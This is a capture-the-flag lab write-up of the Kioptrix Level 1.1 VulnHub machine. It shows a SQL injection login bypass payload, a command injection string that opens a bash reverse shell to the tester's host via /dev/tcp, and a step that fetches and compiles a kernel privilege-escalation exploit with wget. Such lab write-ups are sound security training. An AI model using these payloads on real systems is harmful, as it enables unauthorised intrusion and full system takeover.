# Kioptrix Level 1.1 — VulnHub CTF Writeup

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-CentOS-orange) ![Status](https://img.shields.io/badge/Status-Pwned%20%F0%9F%8F%86-brightgreen)

## Machine Info

| Field | Details |
|---|---|
| Platform | VulnHub |
| Difficulty | Easy |
| OS | CentOS 4.5 (Final) |
| IP | 192.168.56.105 |
| Date Completed | May 22, 2026 |

---

## Summary

Kioptrix 1.1 is a classic beginner machine featuring SQL injection on a login form to bypass authentication, command injection on an admin web console to get a reverse shell, and a Linux kernel privilege escalation exploit (CVE-2009-2692) to achieve root. OWASP ZAP was also used for automated vulnerability scanning.

---

## Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port scanning and service detection |
| OWASP ZAP | Automated web vulnerability scanning |
| Browser | Manual SQL injection testing |
| Netcat (nc) | Reverse shell listener |
| searchsploit | Kernel exploit search |
| gcc | Compiling the kernel exploit |
| wget | Transferring exploit to target |
| Python3 | Serving exploit file via HTTP |

---

## Enumeration

### Step 1 — Port Scanning

```bash
nmap -sV -sC 192.168.56.105
```

**Results:**

```
PORT     STATE  SERVICE   VERSION
22/tcp   open   ssh       OpenSSH 3.9p1 Debian
80/tcp   open   http      Apache httpd 2.0.52 (CentOS)
111/tcp  open   rpcbind   2 (RPC #100000)
443/tcp  open   ssl/http  Apache httpd 2.0.52 (CentOS)
631/tcp  open   ipp       CUPS 1.1
3306/tcp open   mysql     MySQL (unauthorized)
```

Key findings:
- Port 80/443 — Apache web server
- Port 3306 — MySQL exposed
- `http-title` — Site has no title (login page)
- OS: CentOS 4.5

### Step 2 — Web Vulnerability Scanning with OWASP ZAP

Ran an automated scan against `http://192.168.56.105`:

**OWASP ZAP Findings:**

| Alert | Risk | Notes |
|---|---|---|
| SQL Injection | High | POST to index.php |
| Absence of Anti-CSRF Tokens | Medium | Login form |
| Content Security Policy Not Set | Medium | |
| Missing Anti-clickjacking Header | Medium | |
| Server Version Information Leak | Low | Apache version exposed |
| X-Powered-By Header | Low | PHP version exposed |
| Tech Detected | Info | Apache, CentOS, PHP |

Most critical finding: **SQL Injection on the login form (index.php)**

### Step 3 — Manual Web Enumeration

Visiting `http://192.168.56.105` revealed a **Remote System Administration Login** page with username and password fields.

---

## Exploitation

### SQL Injection — Authentication Bypass

Tested SQL injection payloads in the username field:

**Payload 1 (comment-based):**
```
admin' --
```
Password: anything → Did not work cleanly

**Payload 2 (OR-based):**
```
admin' or '1'='1
```
Password: anything → **It worked!**

Successfully bypassed authentication and accessed the **Basic Administrative Web Console** — a ping utility.

---

## Command Injection → Reverse Shell

The web console allowed pinging machines on the network. The input was vulnerable to **command injection**.

**Step 1 — Test command injection:**
```
192.168.56.102; whoami
```
Output showed: `apache` — confirmed command injection works!

**Step 2 — Set up netcat listener on Kali:**
```bash
nc -lvp 4444
```

**Step 3 — Inject bash reverse shell:**
```
192.168.56.105; bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
```

Received reverse shell connection:
```
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 32830
bash-3.00$ whoami
apache
```

---

## Post-Exploitation Enumeration

```bash
cat /etc/redhat-release
# CentOS release 4.5 (Final)

lsb_release -a
# CentOS release 4.5 (Final), Kernel: Linux 2.6.9

cat /etc/passwd
# enumerated system users
```

Checked OS version: **CentOS 4.5, Kernel 2.6.9**

---

## Privilege Escalation

### Linux Kernel Exploit — CVE-2009-2692 (Linux 2.6.x sock_sendpage)

Searched for kernel exploits on Kali:

```bash
searchsploit CentOS 4.5
```

Found: **Linux Kernel 3.14.5 (CentOS 7/RHEL) — 'libfutex' Local Privilege Escalation**

Also found exploit **9479.c** (sock_sendpage NULL pointer dereference — affects Linux 2.6.x):

```bash
searchsploit -m linux/local/9479.c
cp /usr/share/exploitdb/exploits/linux/local/9479.c ~/
```

**Step 1 — Serve exploit via Python HTTP server on Kali:**
```bash
python3 -m http.server 8888
```

**Step 2 — Download exploit on target:**
```bash
cd /tmp
wget http://192.168.56.102:8888/9479.c
```

**Step 3 — Compile and run:**
```bash
gcc 9479.c -o exploit3
./exploit3
```

**Root shell obtained!**
```
sh-3.00# whoami
root
```

---

## Attack Chain

```
Nmap (port scan → Apache, MySQL, CentOS 4.5)
    ↓
OWASP ZAP (automated scan → SQL Injection found)
    ↓
SQL Injection → auth bypass → admin web console
    ↓
Command Injection → bash reverse shell (apache user)
    ↓
OS enumeration → CentOS 4.5, Kernel 2.6.9
    ↓
searchsploit → CVE-2009-2692 (9479.c)
    ↓
wget exploit → gcc compile → execute
    ↓
🏆 root shell
```

---

## Key Takeaways

- **OWASP ZAP** is a great tool for automated web scanning — it found the SQL injection vulnerability immediately
- **SQL injection** in login forms can completely bypass authentication without knowing any credentials
- **Command injection** is dangerous when user input is passed directly to system commands (like ping)
- Always check the **OS and kernel version** after getting a shell — outdated kernels often have public exploits
- Use **searchsploit** to quickly find local privilege escalation exploits
- Serve exploit files with **python3 -m http.server** and download with **wget** — a clean file transfer technique

---

## Vulnerabilities Summary

| Vulnerability | Type | Impact |
|---|---|---|
| SQL Injection on login | Authentication Bypass | Critical |
| Command Injection in ping utility | RCE | Critical |
| Outdated Linux Kernel 2.6.9 | Local Privilege Escalation | Critical |
| MySQL exposed on port 3306 | Information Disclosure | Medium |
| Apache/PHP version disclosure | Information Disclosure | Low |

